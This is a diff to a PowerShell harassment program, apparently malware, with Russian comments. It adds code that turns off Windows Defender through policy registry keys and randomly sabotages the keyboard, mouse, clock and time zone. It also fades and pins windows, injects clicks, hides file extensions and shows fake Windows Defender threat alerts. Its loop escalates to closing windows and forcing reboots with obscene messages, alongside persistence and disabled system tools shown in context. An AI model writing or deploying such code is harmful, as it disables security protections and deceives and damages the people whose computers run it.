@@ -13,6 +13,7 @@ $Lock  = "$Root\run.lock"
 $Stage = "$Root\stage.dat"
 $Beat  = "$Root\beat.dat"
 $Boot  = "$Root\boot.dat"
+$Tz    = "$Root\tz.dat"
 
 # ---------- один экземпляр ----------
 New-Item -ItemType Directory $Root -Force | Out-Null
@@ -22,7 +23,10 @@ if (Test-Path $Lock) {
 Set-Content $Lock (Get-Date)
 
 $firstRun = -not (Test-Path $Stage)
-if ($firstRun) { Set-Content $Stage (Get-Date) }
+if ($firstRun) {
+  Set-Content $Stage (Get-Date)
+  (tzutil /g) -replace "`r","" | Out-File $Tz -Encoding ASCII
+}
 $start = [datetime](Get-Content $Stage)
 
 # ---------- маскировка ----------
@@ -35,6 +39,10 @@ try {
   Set-MpPreference -DisableIOAVProtection $true
   Set-MpPreference -DisableScriptScanning $true
   Set-MpPreference -EnableControlledFolderAccess Disabled
+  New-Item 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Force | Out-Null
+  Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' 'DisableAntiSpyware' 1 -Type DWord
+  New-Item 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection' -Force | Out-Null
+  Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection' 'DisableRealtimeMonitoring' 1 -Type DWord
 } catch {}
 
 # ---------- закрепление ----------
@@ -84,6 +92,11 @@ public class W {
   [DllImport("user32.dll")] public static extern bool MoveWindow(IntPtr h,int x,int y,int w,int t,bool r);
   [DllImport("user32.dll")] public static extern bool GetWindowRect(IntPtr h, out RECT r);
   [DllImport("user32.dll", CharSet=CharSet.Auto)] public static extern int SetWindowText(IntPtr h, string t);
+  [DllImport("user32.dll")] public static extern int GetWindowLong(IntPtr h,int i);
+  [DllImport("user32.dll")] public static extern int SetWindowLong(IntPtr h,int i,int v);
+  [DllImport("user32.dll")] public static extern bool SetLayeredWindowAttributes(IntPtr h,uint c,byte a,uint f);
+  [DllImport("user32.dll")] public static extern bool SetWindowPos(IntPtr h,IntPtr a,int x,int y,int w,int t,uint f);
+  [DllImport("user32.dll")] public static extern void mouse_event(uint f,uint dx,uint dy,uint d,UIntPtr e);
   public struct RECT { public int L,T,R,B; }
 }
 '@
@@ -164,6 +177,77 @@ function Ghost {
 
 function DoLock { rundll32.exe user32.dll,LockWorkStation }
 
+function KeyLag {
+  Set-ItemProperty 'HKCU:\Control Panel\Keyboard' 'KeyboardDelay' '3'
+  Set-ItemProperty 'HKCU:\Control Panel\Keyboard' 'KeyboardSpeed' '0'
+}
+
+function KeyFast {
+  Set-ItemProperty 'HKCU:\Control Panel\Keyboard' 'KeyboardDelay' '0'
+  Set-ItemProperty 'HKCU:\Control Panel\Keyboard' 'KeyboardSpeed' '31'
+}
+
+function MouseSlow { Set-ItemProperty 'HKCU:\Control Panel\Mouse' 'MouseSensitivity' '1' }
+function MouseFast { Set-ItemProperty 'HKCU:\Control Panel\Mouse' 'MouseSensitivity' '20' }
+
+function Clock {
+  $f = @('HH:mm:ss.fff','hh:mm:ss tt','yyyy-MM-dd HH:mm','ddd dd MMMM','HH:mm') | Get-Random
+  Set-ItemProperty 'HKCU:\Control Panel\International' 'sTimeFormat' $f
+  Set-ItemProperty 'HKCU:\Control Panel\International' 'sShortTime'  $f
+}
+
+function Zone {
+  $z = @('Dateline Standard Time','Hawaiian Standard Time','Alaskan Standard Time',
+         'Pacific Standard Time','GMT Standard Time','W. Europe Standard Time',
+         'Nepal Standard Time','Iran Standard Time','AUS Eastern Standard Time') | Get-Random
+  tzutil /s $z
+}
+
+function Fade {
+  try {
+    $h = [W]::GetForegroundWindow()
+    $s = [W]::GetWindowLong($h,-20)
+    [W]::SetWindowLong($h,-20,($s -bor 0x80000))
+    [W]::SetLayeredWindowAttributes($h,0,(Get-Random -Min 40 -Max 95),2)
+  } catch {}
+}
+
+function OnTop {
+  try { [W]::SetWindowPos([W]::GetForegroundWindow(),[IntPtr](-1),0,0,0,0,0x0003) } catch {}
+}
+
+function Scroll {
+  for ($i = 0; $i -lt (Get-Random -Min 3 -Max 10); $i++) {
+    [W]::mouse_event(0x0800,0,0,[uint32]((Get-Random -Min 1 -Max 3) * -120),[UIntPtr]::Zero)
+    Start-Sleep -Milliseconds (Get-Random -Min 50 -Max 120)
+  }
+}
+
+function Click {
+  [W]::mouse_event(0x0002,0,0,0,[UIntPtr]::Zero)
+  Start-Sleep -Milliseconds 40
+  [W]::mouse_event(0x0004,0,0,0,[UIntPtr]::Zero)
+}
+
+function HideExt {
+  Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced' 'HideFileExt' 1
+  Stop-Process -Name explorer -Force
+}
+
+function Mute { (New-Object -ComObject WScript.Shell).SendKeys([char]173) }
+
+function Alert {
+  $t = @(
+    'Обнаружено 3 угрозы. Нажмите ОК для очистки.',
+    'Срок действия лицензии Windows истёк.',
+    'Требуется перезагрузка для завершения установки обновления.',
+    'Недостаточно места на диске C:. Освободите 4,2 ГБ.',
+    'Драйвер видеокарты перестал отвечать и был восстановлен.'
+  ) | Get-Random
+  $cmd = 'Add-Type -AssemblyName System.Windows.Forms;[Windows.Forms.MessageBox]::Show(' + "'$t'" + ",'Защитник Windows','OK','Warning','Button1','DefaultDesktopOnly')"
+  Start-Process powershell -WindowStyle Hidden -ArgumentList ('-w hidden -ep bypass -c "' + $cmd + '"')
+}
+
 $LockPs = @'
 Add-Type -AssemblyName PresentationFramework
 $w = New-Object Windows.Window
@@ -218,9 +302,21 @@ function Uninstall {
   schtasks /delete /tn "SysCacheUpdate" /f | Out-Null
   Remove-ItemProperty $k1 'DisableTaskMgr'; Remove-ItemProperty $k1 'DisableRegistryTools'
   Remove-ItemProperty $k2 'DisableCMD'
+  try {
+    Remove-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' 'DisableAntiSpyware'
+    Remove-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection' 'DisableRealtimeMonitoring'
+  } catch {}
   Set-ItemProperty 'HKCU:\Control Panel\Mouse' 'SwapMouseButtons' 0
+  Set-ItemProperty 'HKCU:\Control Panel\Mouse' 'MouseSensitivity' '10'
+  Set-ItemProperty 'HKCU:\Control Panel\Keyboard' 'KeyboardDelay' '1'
+  Set-ItemProperty 'HKCU:\Control Panel\Keyboard' 'KeyboardSpeed' '31'
   Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced' 'HideIcons' 0
+  Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced' 'HideFileExt' 0
+  Set-ItemProperty 'HKCU:\Control Panel\Desktop' 'ScreenSaveTimeOut' 600
   Set-ItemProperty 'HKCU:\Control Panel\Desktop' 'Wallpaper' ''
+  Set-ItemProperty 'HKCU:\Control Panel\International' 'sTimeFormat' 'HH:mm:ss'
+  Set-ItemProperty 'HKCU:\Control Panel\International' 'sShortTime' 'HH:mm'
+  if (Test-Path $Tz) { tzutil /s ((Get-Content $Tz) -join '') }
   rundll32.exe user32.dll,UpdatePerUserSystemParameters
   Stop-Process -Name explorer -Force
   Get-Process powershell | Stop-Process
@@ -260,12 +356,29 @@ $Creep = @(
  { Flash; Start-Sleep -m 400; Flash }
 )
 
+$Creep2 = @(
+ { KeyLag },
+ { KeyFast },
+ { MouseSlow },
+ { MouseFast },
+ { Clock },
+ { Zone },
+ { Fade },
+ { OnTop },
+ { Scroll },
+ { Click },
+ { HideExt },
+ { Mute },
+ { Alert },
+ { Zone; Start-Sleep -m 500; Clock }
+)
+
 $Heavy = @(
  { Say ($Phrases | Get-Random) },
  { Start-Process msedge 'https://fakeupdate.net/win11u/' },
  { Start-Process 'https://www.youtube.com/watch?v=dQw4w9WgXcQ' },
  { Stop-Process -Name explorer -Force },
- { [Windows.Forms.SendKeys]::SendWait('^w') },
+ { [Windows.Forms.SendKeys]::SendWait('%{F4}') },
  { [Windows.Forms.SendKeys]::SendWait('%{TAB}') },
  { 1..12 | % { ('FUCK YOU ' * 250) | Out-File "$env:USERPROFILE\Desktop\$(Get-Random -Max 99999).txt" } },
  { $s = (New-Object -ComObject WScript.Shell); 1..6 | % { $s.SendKeys([char]175) } }
@@ -278,7 +391,7 @@ $Ext = @(
    Set-ItemProperty 'HKCU:\Control Panel\Desktop' 'ScreenSaveActive' 1
    Set-ItemProperty 'HKCU:\Control Panel\Desktop' 'SCRNSAVE.EXE' 'C:\Windows\System32\scrnsave.scr' },
  { Say ($Phrases | Get-Random); Say ($Phrases | Get-Random) },
- { [Windows.Forms.SendKeys]::SendWait('^w'); [Windows.Forms.SendKeys]::SendWait('^w') }
+ { [Windows.Forms.SendKeys]::SendWait('%{F4}'); [Windows.Forms.SendKeys]::SendWait('%{F4}') }
 )
 
 # ---------- старт ----------
@@ -335,15 +448,15 @@ while ($true) {
     Set-Content $Beat (Get-Date)
   }
 
-  if ($forced)       { $pool = $Creep + $Heavy + $Ext; $nap = Get-Random -Min 2 -Max 6 }
+  if ($forced)       { $pool = $Creep + $Creep2 + $Heavy + $Ext; $nap = Get-Random -Min 2 -Max 6 }
   elseif ($m -lt 3)  { $pool = $Mild;                 $nap = Get-Random -Min 20 -Max 45 }
   elseif ($m -lt 8)  { $pool = $Mild + $Med + $Creep; $nap = Get-Random -Min 12 -Max 25 }
-  elseif ($m -lt 18) { $pool = $Creep + $Heavy;       $nap = Get-Random -Min 6 -Max 14 }
-  else               { $pool = $Creep + $Heavy + $Ext; $nap = Get-Random -Min 3 -Max 8 }
+  elseif ($m -lt 14) { $pool = $Creep + $Creep2;      $nap = Get-Random -Min 6 -Max 14 }
+  else               { $pool = $Creep2 + $Heavy + $Ext; $nap = Get-Random -Min 3 -Max 8 }
 
   & ($pool | Get-Random)
 
-  if ($m -gt 25 -and (Get-Random -Max 100) -lt 6) { shutdown /r /t 30 /c "FUCK YOU" }
+  if ($m -gt 12 -and (Get-Random -Max 100) -lt 8) { shutdown /r /t 30 /c "FUCK YOU" }
 
   Start-Sleep -Seconds $nap
 }
